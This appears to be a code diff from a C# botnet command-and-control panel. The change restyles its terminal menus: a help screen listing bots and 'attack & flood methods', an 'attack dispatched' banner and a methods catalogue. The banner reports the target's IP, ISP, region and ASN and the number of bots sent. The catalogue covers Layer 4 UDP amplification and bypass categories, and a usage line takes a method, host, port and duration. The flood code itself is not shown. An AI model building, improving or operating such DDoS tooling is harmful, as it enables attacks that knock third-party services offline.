@@ -719,15 +719,14 @@ namespace Agent
             if (cmdName.Equals("help", StringComparison.OrdinalIgnoreCase))
             {
                 var sb = new StringBuilder();
-                sb.AppendLine("\x1b[38;5;240m  ┌────────────────────────────────────────────────────────┐\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;97m                 AVAILABLE COMMANDS                     \x1b[0m\x1b[38;5;240m│\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────┤\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mhelp\x1b[0m              \x1b[90m-\x1b[0m Show this help menu                \x1b[38;5;240m│\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mmethods\x1b[0m           \x1b[90m-\x1b[0m List all attack & flood methods    \x1b[38;5;240m│\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mbots\x1b[0m              \x1b[90m-\x1b[0m Show number of connected bots      \x1b[38;5;240m│\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mclear / cls\x1b[0m       \x1b[90m-\x1b[0m Clear the terminal screen          \x1b[38;5;240m│\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[96mexit / quit\x1b[0m       \x1b[90m-\x1b[0m Disconnect session                 \x1b[38;5;240m│\x1b[0m");
-                sb.AppendLine("\x1b[38;5;240m  └────────────────────────────────────────────────────────┘\x1b[0m");
+                sb.AppendLine();
+                sb.AppendLine("  \x1b[1;97mCOMMANDS\x1b[0m");
+                sb.AppendLine("  \x1b[96mhelp\x1b[0m              \x1b[90m:\x1b[0m \x1b[38;5;250mShow available commands\x1b[0m");
+                sb.AppendLine("  \x1b[96mmethods\x1b[0m           \x1b[90m:\x1b[0m \x1b[38;5;250mList all attack & flood methods\x1b[0m");
+                sb.AppendLine("  \x1b[96mbots\x1b[0m              \x1b[90m:\x1b[0m \x1b[38;5;250mShow number of connected bots\x1b[0m");
+                sb.AppendLine("  \x1b[96mclear / cls\x1b[0m       \x1b[90m:\x1b[0m \x1b[38;5;250mClear terminal screen\x1b[0m");
+                sb.AppendLine("  \x1b[96mexit / quit\x1b[0m       \x1b[90m:\x1b[0m \x1b[38;5;250mDisconnect session\x1b[0m");
+                sb.AppendLine();
                 channel.SendData(Encoding.UTF8.GetBytes(sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n")));
             }
             else if (cmdName.Equals("methods", StringComparison.OrdinalIgnoreCase))
@@ -859,19 +858,17 @@ namespace Agent
             var geo = ResolveTargetGeo(targetHost);
             var sb = new StringBuilder();
             sb.AppendLine();
-            sb.AppendLine("\x1b[38;5;240m  ┌────────────────────────────────────────────────────────┐\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;92m                 ATTACK LAUNCHED SUCCESSFULLY          \x1b[0m\x1b[38;5;240m│\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  ├────────────────────────────────────────────────────────┤\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mTarget   :\x1b[0m \x1b[97m{targetHost}\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mIP       :\x1b[0m \x1b[38;5;45m{geo.ResolvedIp}\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mPort     :\x1b[0m \x1b[93m{port}\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mDuration :\x1b[0m \x1b[93m{time}s\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mMethod   :\x1b[0m \x1b[96m.{methodName.ToUpper()}\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mISP      :\x1b[0m \x1b[38;5;250m{geo.Isp}\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mRegion   :\x1b[0m \x1b[38;5;250m{geo.Region}, {geo.Country}\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mASN      :\x1b[0m \x1b[38;5;244m{geo.Asn}\x1b[0m");
-            sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  \x1b[90mSwarm    :\x1b[0m \x1b[1;92mSent to {botCount} bot(s)\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  └────────────────────────────────────────────────────────┘\x1b[0m");
+            sb.AppendLine("  \x1b[1;92mATTACK DISPATCHED\x1b[0m");
+            sb.AppendLine($"  \x1b[90mTarget   :\x1b[0m \x1b[97m{targetHost}\x1b[0m");
+            sb.AppendLine($"  \x1b[90mIP       :\x1b[0m \x1b[38;5;45m{geo.ResolvedIp}\x1b[0m");
+            sb.AppendLine($"  \x1b[90mPort     :\x1b[0m \x1b[93m{port}\x1b[0m");
+            sb.AppendLine($"  \x1b[90mDuration :\x1b[0m \x1b[93m{time}s\x1b[0m");
+            sb.AppendLine($"  \x1b[90mMethod   :\x1b[0m \x1b[96m.{methodName.ToUpper()}\x1b[0m");
+            sb.AppendLine($"  \x1b[90mISP      :\x1b[0m \x1b[38;5;250m{geo.Isp}\x1b[0m");
+            sb.AppendLine($"  \x1b[90mRegion   :\x1b[0m \x1b[38;5;250m{geo.Region}, {geo.Country}\x1b[0m");
+            sb.AppendLine($"  \x1b[90mASN      :\x1b[0m \x1b[38;5;244m{geo.Asn}\x1b[0m");
+            sb.AppendLine($"  \x1b[90mSwarm    :\x1b[0m \x1b[1;92mSent to {botCount} bot(s)\x1b[0m");
+            sb.AppendLine();
             return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
         }
 
@@ -966,22 +963,20 @@ namespace Agent
 
             var sb = new StringBuilder();
             sb.AppendLine();
-            sb.AppendLine("\x1b[38;5;240m  ┌──────────────────────────────────────────────────────────────────────────────────┐\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m \x1b[1;97m                             ATTACK & FLOOD METHODS                               \x1b[0m\x1b[38;5;240m│\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  ├──────────────────────────────────────────────────────────────────────────────────┤\x1b[0m");
+            sb.AppendLine("  \x1b[1;97mATTACK & FLOOD METHODS\x1b[0m");
 
             void AppendCategory(string title, string colorCode, HashSet<string> names)
             {
                 var active = _methods.Where(m => names.Contains(m.Name)).ToList();
                 if (active.Count == 0) return;
 
-                sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m  {colorCode}◈ {title}\x1b[0m");
+                sb.AppendLine();
+                sb.AppendLine($"  {colorCode}{title}\x1b[0m");
                 foreach (var m in active)
                 {
                     string desc = descriptions.TryGetValue(m.Name, out var d) ? d : "Custom execution method";
-                    sb.AppendLine($"\x1b[38;5;240m  │\x1b[0m    \x1b[38;5;244m•\x1b[0m \x1b[96m.{m.Name,-13}\x1b[0m \x1b[90m:\x1b[0m \x1b[38;5;250m{desc}\x1b[0m");
+                    sb.AppendLine($"    \x1b[96m.{m.Name,-13}\x1b[0m \x1b[90m:\x1b[0m \x1b[38;5;250m{desc}\x1b[0m");
                 }
-                sb.AppendLine("\x1b[38;5;240m  │\x1b[0m");
             }
 
             AppendCategory("LAYER 4 UDP (AMPLIFICATION & BYPASS)", "\x1b[1;95m", l4Udp);
@@ -999,10 +994,10 @@ namespace Agent
                 AppendCategory("CUSTOM / OTHER METHODS", "\x1b[1;96m", otherSet);
             }
 
-            sb.AppendLine("\x1b[38;5;240m  ├──────────────────────────────────────────────────────────────────────────────────┤\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[90mUsage  :\x1b[0m \x1b[93m<method> <host/ip/url> <port> <time>\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  │\x1b[0m  \x1b[90mExample:\x1b[0m \x1b[38;5;45mhttps https://example.com 443 60\x1b[0m");
-            sb.AppendLine("\x1b[38;5;240m  └──────────────────────────────────────────────────────────────────────────────────┘\x1b[0m");
+            sb.AppendLine();
+            sb.AppendLine("  \x1b[90mUsage  :\x1b[0m \x1b[93m<method> <host/ip/url> <port> <time>\x1b[0m");
+            sb.AppendLine("  \x1b[90mExample:\x1b[0m \x1b[38;5;45m.https https://example.com 443 60\x1b[0m");
+            sb.AppendLine();
 
             return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
         }
